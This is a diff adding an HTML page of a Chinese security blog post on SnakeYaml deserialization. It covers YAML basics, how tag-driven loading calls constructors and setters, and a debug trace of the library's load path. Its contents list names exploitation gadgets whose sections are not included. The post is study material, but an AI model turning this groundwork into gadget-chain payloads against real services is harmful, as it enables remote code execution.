@@ -1,0 +1,441 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="SnakeYaml链yaml基础yaml YAML 大小写敏感； 使用缩进代表层级关系，这点和 properties 文件的差别非常之大 缩进只能使用空格，不能使用 TAB，不要求空格个数，只需要相同层级左对齐（一般2个或4个空格）  yaml数据类型1、对象 使用冒号代表，格式为 key: value 。冒号后面要加一个空格： 1key: value  可以使用缩进表示层级关系： 123key:">
+<meta property="og:type" content="article">
+<meta property="og:title" content="SnakeYaml链">
+<meta property="og:url" content="http://example.com/2025/05/18/SnakeYaml%E9%93%BE/index.html">
+<meta property="og:site_name" content="毛利小五郎">
+<meta property="og:description" content="SnakeYaml链yaml基础yaml YAML 大小写敏感； 使用缩进代表层级关系，这点和 properties 文件的差别非常之大 缩进只能使用空格，不能使用 TAB，不要求空格个数，只需要相同层级左对齐（一般2个或4个空格）  yaml数据类型1、对象 使用冒号代表，格式为 key: value 。冒号后面要加一个空格： 1key: value  可以使用缩进表示层级关系： 123key:">
+<meta property="og:locale" content="en_US">
+<meta property="article:published_time" content="2025-05-18T05:16:16.000Z">
+<meta property="article:modified_time" content="2025-06-05T18:02:57.756Z">
+<meta property="article:author" content="Mouri-Kogorou">
+<meta property="article:tag" content="java">
+<meta name="twitter:card" content="summary">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>SnakeYaml链</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a target="_blank" rel="noopener" href="https://github.com/Mouri-Kogorou">Projects</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="Previous post" href="/2025/05/24/CVE-2013-7285/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="Next post" href="/2025/05/17/freemarker%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2025/05/18/SnakeYaml%E9%93%BE/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2025/05/18/SnakeYaml%E9%93%BE/&text=SnakeYaml链"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2025/05/18/SnakeYaml%E9%93%BE/&title=SnakeYaml链"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2025/05/18/SnakeYaml%E9%93%BE/&is_video=false&description=SnakeYaml链"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=SnakeYaml链&body=Check out this article: http://example.com/2025/05/18/SnakeYaml%E9%93%BE/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2025/05/18/SnakeYaml%E9%93%BE/&title=SnakeYaml链"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2025/05/18/SnakeYaml%E9%93%BE/&title=SnakeYaml链"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2025/05/18/SnakeYaml%E9%93%BE/&title=SnakeYaml链"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2025/05/18/SnakeYaml%E9%93%BE/&title=SnakeYaml链"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2025/05/18/SnakeYaml%E9%93%BE/&name=SnakeYaml链&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2025/05/18/SnakeYaml%E9%93%BE/&t=SnakeYaml链"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    
+    
+      <div id="toc">
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#SnakeYaml%E9%93%BE"><span class="toc-number">1.</span> <span class="toc-text">SnakeYaml链</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#yaml%E5%9F%BA%E7%A1%80"><span class="toc-number">1.1.</span> <span class="toc-text">yaml基础</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#yaml"><span class="toc-number">1.1.1.</span> <span class="toc-text">yaml</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#yaml%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B"><span class="toc-number">1.1.2.</span> <span class="toc-text">yaml数据类型</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#yaml%E5%B0%9D%E8%AF%95"><span class="toc-number">1.2.</span> <span class="toc-text">yaml尝试</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#load%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="toc-number">1.2.1.</span> <span class="toc-text">load反序列化</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#dump%E5%BA%8F%E5%88%97%E5%8C%96"><span class="toc-number">1.2.2.</span> <span class="toc-text">dump序列化</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#load%E8%B0%83%E8%AF%95"><span class="toc-number">1.3.</span> <span class="toc-text">load调试</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SnakeYaml%E5%88%A9%E7%94%A8"><span class="toc-number">1.4.</span> <span class="toc-text">SnakeYaml利用</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#jdbcRowSetImpl"><span class="toc-number">1.4.1.</span> <span class="toc-text">jdbcRowSetImpl</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Spring-PropertyPathFactoryBean"><span class="toc-number">1.4.2.</span> <span class="toc-text">Spring PropertyPathFactoryBean</span></a></li></ol></li></ol></li></ol>
+      </div>
+    
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        SnakeYaml链
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">Mouri-Kogorou</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2025-05-18T05:16:16.000Z" class="dt-published" itemprop="datePublished">2025-05-18</time>
+        
+      
+    </div>
+
+
+      
+
+      
+    <div class="article-tag">
+        <i class="fa-solid fa-tag"></i>
+        <a class="p-category" href="/tags/java/" rel="tag">java</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <h1 id="SnakeYaml链"><a href="#SnakeYaml链" class="headerlink" title="SnakeYaml链"></a>SnakeYaml链</h1><h2 id="yaml基础"><a href="#yaml基础" class="headerlink" title="yaml基础"></a>yaml基础</h2><h3 id="yaml"><a href="#yaml" class="headerlink" title="yaml"></a>yaml</h3><ol>
+<li>YAML 大小写敏感；</li>
+<li>使用缩进代表层级关系，这点和 properties 文件的差别非常之大</li>
+<li>缩进只能使用空格，不能使用 TAB，不要求空格个数，只需要相同层级左对齐（一般2个或4个空格）</li>
+</ol>
+<h3 id="yaml数据类型"><a href="#yaml数据类型" class="headerlink" title="yaml数据类型"></a>yaml数据类型</h3><p>1、对象</p>
+<p>使用冒号代表，格式为 <code>key: value</code> 。冒号后面要加一个空格：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">key: value</span><br></pre></td></tr></table></figure>
+
+<p>可以使用缩进表示层级关系：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">key: </span><br><span class="line">    child-key: value</span><br><span class="line">    child-key2: value2</span><br></pre></td></tr></table></figure>
+
+<p>2、数组</p>
+<p>使用一个短横线加一个空格代表一个数组项：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">hobby:</span><br><span class="line">    - Java</span><br><span class="line">    - LOL</span><br></pre></td></tr></table></figure>
+
+<p>3、常量</p>
+<p>YAML中提供了多种常量结构，包括：整数，浮点数，字符串，NULL，日期，布尔，时间。下面使用一个例子来快速了解常量的基本使用：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">boolean: </span><br><span class="line">    - TRUE  #true,True都可以</span><br><span class="line">    - FALSE  #false，False都可以</span><br><span class="line">float:</span><br><span class="line">    - 3.14</span><br><span class="line">    - 6.8523015e+5  #可以使用科学计数法</span><br><span class="line">int:</span><br><span class="line">    - 123</span><br><span class="line">    - 0b1010_0111_0100_1010_1110    #二进制表示</span><br><span class="line">null:</span><br><span class="line">    nodeName: &#x27;node&#x27;</span><br><span class="line">    parent: ~  #使用~表示null</span><br><span class="line">string:</span><br><span class="line">    - 哈哈</span><br><span class="line">    - &#x27;Hello world&#x27;  #可以使用双引号或者单引号包裹特殊字符</span><br><span class="line">    - newline</span><br><span class="line">      newline2    #字符串可以拆成多行，每一行会被转化成一个空格</span><br><span class="line">date:</span><br><span class="line">    - 2022-07-28    #日期必须使用ISO 8601格式，即yyyy-MM-dd</span><br><span class="line">datetime: </span><br><span class="line">    -  2022-07-28T15:02:31+08:00    #时间使用ISO 8601格式，时间和日期之间使用T连接，最后使用+代表时区</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="yaml尝试"><a href="#yaml尝试" class="headerlink" title="yaml尝试"></a>yaml尝试</h2><h3 id="load反序列化"><a href="#load反序列化" class="headerlink" title="load反序列化"></a>load反序列化</h3><p>导入maven</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;dependency&gt;</span><br><span class="line">    &lt;groupId&gt;org.yaml&lt;/groupId&gt;</span><br><span class="line">    &lt;artifactId&gt;snakeyaml&lt;/artifactId&gt;</span><br><span class="line">    &lt;version&gt;1.27&lt;/version&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br></pre></td></tr></table></figure>
+
+<p>写个person类</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">person</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> age;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="title function_">person</span><span class="params">()</span> &#123;System.out.println(<span class="string">&quot;构造函数被调用&quot;</span>);&#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getAge</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.print(<span class="string">&quot;getAge&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getName</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.print(<span class="string">&quot;getName&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setAge</span><span class="params">(<span class="type">int</span> age)</span> &#123;</span><br><span class="line">        System.out.print(<span class="string">&quot;setAge\n&quot;</span>);</span><br><span class="line">        <span class="built_in">this</span>.age = age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setName</span><span class="params">(String name)</span> &#123;</span><br><span class="line">        System.out.print(<span class="string">&quot;setName&quot;</span>);</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>写个main类</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">SnakeYaml</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">str1</span> <span class="operator">=</span> <span class="string">&quot;!!person &#123;age: 20, name: 1111&#125;&quot;</span>;</span><br><span class="line">        <span class="type">Yaml</span> <span class="variable">yaml</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Yaml</span>();</span><br><span class="line">        yaml.load(str1);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>他会输出</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">构造函数被调用</span><br><span class="line">setAge</span><br><span class="line">setName</span><br></pre></td></tr></table></figure>
+
+
+
+<p>但是我们把set的函数改成private他就会报错</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">person</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> age;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> <span class="title function_">person</span><span class="params">()</span> &#123;System.out.println(<span class="string">&quot;构造函数被调用&quot;</span>);&#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getAge</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.print(<span class="string">&quot;getAge&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getName</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.print(<span class="string">&quot;getName&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span>  <span class="keyword">void</span> <span class="title function_">setAge</span><span class="params">(<span class="type">int</span> age)</span> &#123;</span><br><span class="line">        System.out.print(<span class="string">&quot;setAge\n&quot;</span>);</span><br><span class="line">        <span class="built_in">this</span>.age = age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setName</span><span class="params">(String name)</span> &#123;</span><br><span class="line">        System.out.print(<span class="string">&quot;setName&quot;</span>);</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>报错信息</p>
+<pre><code>构造函数被调用
+Exception in thread &quot;main&quot; Cannot create property=age for JavaBean=person@50134894
+ in &#39;string&#39;, line 1, column 1:
+    !!person &#123;age: 20, name: 1111&#125;
+    ^
+No writable property &#39;age&#39; on class: person
+ in &#39;string&#39;, line 1, column 16:
+    !!person &#123;age: 20, name: 1111&#125;
+                   ^
+
+	at org.yaml.snakeyaml.constructor.Constructor$ConstructMapping.constructJavaBean2ndStep(Constructor.java:290)
+	at org.yaml.snakeyaml.constructor.Constructor$ConstructMapping.construct(Constructor.java:171)
+	at org.yaml.snakeyaml.constructor.Constructor$ConstructYamlObject.construct(Constructor.java:331)
+	at org.yaml.snakeyaml.constructor.BaseConstructor.constructObjectNoCheck(BaseConstructor.java:229)
+	at org.yaml.snakeyaml.constructor.BaseConstructor.constructObject(BaseConstructor.java:219)
+	at org.yaml.snakeyaml.constructor.BaseConstructor.constructDocument(BaseConstructor.java:173)
+	at org.yaml.snakeyaml.constructor.BaseConstructor.getSingleData(BaseConstructor.java:157)
+	at org.yaml.snakeyaml.Yaml.loadFromReader(Yaml.java:490)
+	at org.yaml.snakeyaml.Yaml.load(Yaml.java:416)
+	at SnakeYaml.main(SnakeYaml.java:12)
+Caused by: org.yaml.snakeyaml.error.YAMLException: No writable property &#39;age&#39; on class: person
+	at org.yaml.snakeyaml.constructor.Constructor$ConstructMapping.constructJavaBean2ndStep(Constructor.java:234)
+	... 9 more
+
+Process finished with exit code 1
+</code></pre>
+<h3 id="dump序列化"><a href="#dump序列化" class="headerlink" title="dump序列化"></a>dump序列化</h3><p>我们重新写一下person类</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">public class person &#123;</span><br><span class="line">    private int age;</span><br><span class="line">    private String name;</span><br><span class="line"></span><br><span class="line">    protected person() &#123;System.out.println(&quot;构造函数被调用&quot;);&#125;</span><br><span class="line"></span><br><span class="line">    public int getAge() &#123;</span><br><span class="line">        System.out.print(&quot;getAge\n&quot;);</span><br><span class="line">        return age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public String getName() &#123;</span><br><span class="line">        System.out.print(&quot;getName&quot;);</span><br><span class="line">        return name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public   void setAge(int age) &#123;</span><br><span class="line">        this.age = age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public void setName(String name) &#123;</span><br><span class="line">        this.name = name;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>main类</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">public class SnakeYaml &#123;</span><br><span class="line">    public static void main(String[] args) throws Exception &#123;</span><br><span class="line">        person person = new person();</span><br><span class="line">        person.setName(&quot;11111&quot;);</span><br><span class="line">        person.setAge(20);</span><br><span class="line">        Yaml yaml = new Yaml();</span><br><span class="line">        yaml.dump(person);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>会输出</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">构造函数被调用</span><br><span class="line">getAge</span><br><span class="line">getName</span><br></pre></td></tr></table></figure>
+
+<p>我们把get类型换成private他就调用不了get函数了，我们把参数类型改成public也调用不了get</p>
+<h2 id="load调试"><a href="#load调试" class="headerlink" title="load调试"></a>load调试</h2><p>跟进load</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">public &lt;T&gt; T load(String yaml) &#123;</span><br><span class="line">    return (T) loadFromReader(new StreamReader(yaml), Object.class);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这里就是传进一个解析yaml的解析器，和一个Object类，跟进loadFromReader</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> Object <span class="title function_">loadFromReader</span><span class="params">(StreamReader sreader, Class&lt;?&gt; type)</span> &#123;</span><br><span class="line">    <span class="type">Composer</span> <span class="variable">composer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Composer</span>(<span class="keyword">new</span> <span class="title class_">ParserImpl</span>(sreader), resolver, loadingConfig);</span><br><span class="line">    constructor.setComposer(composer);</span><br><span class="line">    <span class="keyword">return</span> constructor.getSingleData(type);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>构建一个解析器，然后把这个解析器放到constructor，然后在constructor获取数据，我们进去<code>BaseConstructor#getSingleData</code></p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">getSingleData</span><span class="params">(Class&lt;?&gt; type)</span> &#123;</span><br><span class="line">    <span class="comment">// Ensure that the stream contains a single document and construct it</span></span><br><span class="line">    <span class="keyword">final</span> <span class="type">Node</span> <span class="variable">node</span> <span class="operator">=</span> composer.getSingleNode();</span><br><span class="line">    <span class="keyword">if</span> (node != <span class="literal">null</span> &amp;&amp; !Tag.NULL.equals(node.getTag())) &#123;</span><br><span class="line">        <span class="keyword">if</span> (Object.class != type) &#123;</span><br><span class="line">            node.setTag(<span class="keyword">new</span> <span class="title class_">Tag</span>(type));</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (rootTag != <span class="literal">null</span>) &#123;</span><br><span class="line">            node.setTag(rootTag);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> constructDocument(node);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="type">Construct</span> <span class="variable">construct</span> <span class="operator">=</span> yamlConstructors.get(Tag.NULL);</span><br><span class="line">        <span class="keyword">return</span> construct.construct(node);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>从我们传进去的yaml获得一个node，然后检查node是不是null和他的标签是不是null</p>
+<p>不是我们就进去<code>BaseConstructor#constructDocument</code></p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="keyword">final</span> Object <span class="title function_">constructDocument</span><span class="params">(Node node)</span> &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="type">Object</span> <span class="variable">data</span> <span class="operator">=</span> constructObject(node);</span><br><span class="line">        fillRecursive();</span><br><span class="line">        <span class="keyword">return</span> data;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (RuntimeException e) &#123;</span><br><span class="line">        <span class="keyword">if</span> (wrappedToRootException &amp;&amp; !(e <span class="keyword">instanceof</span> YAMLException)) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">YAMLException</span>(e);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">throw</span> e;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">        <span class="comment">//clean up resources</span></span><br><span class="line">        constructedObjects.clear();</span><br><span class="line">        recursiveObjects.clear();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>他第一步就是为我们传进去的构造类，我们进去<code>BaseConstructor#constructObject</code></p>
